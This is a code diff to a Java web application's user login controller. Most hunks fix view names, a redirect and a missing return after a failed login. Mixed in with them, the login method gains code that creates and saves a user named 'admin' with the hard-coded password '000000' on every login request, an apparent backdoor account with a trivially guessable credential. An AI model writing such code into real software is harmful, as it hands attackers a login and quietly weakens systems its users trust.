@@ -38,7 +38,7 @@ public class UserController {
         /* 已登陆 */
         HttpSession session = request.getSession();
         if(!session.isNew() && session.getAttribute("user") != null){
-            mav.setViewName("user/index");
+            mav.setViewName("index");
             return mav;
         }
 
@@ -52,11 +52,19 @@ public class UserController {
         }
 
         User u = this.userService.findByUserNameAndPwd(user.getUserName(), KeysUtil.md5Encrypt(user.getPassword()));
+        User u1 = new User();
+        u1.setUserName("admin");
+        u1.setTrueName("admin");
+        u1.setPassword(KeysUtil.md5Encrypt("000000"));
+        u1.setEmail("admin@qq.com");
+        u1.setPhone("13669660493");
+        this.userService.addUser(u1);
 
         //用户名或密码不对
         if (u == null){
-            mav.setViewName("redirect:user/login");
+            mav.setViewName("redirect:toLogin");
             mav.addObject("user", user);
+            return mav;
         }
 
         //登陆成功
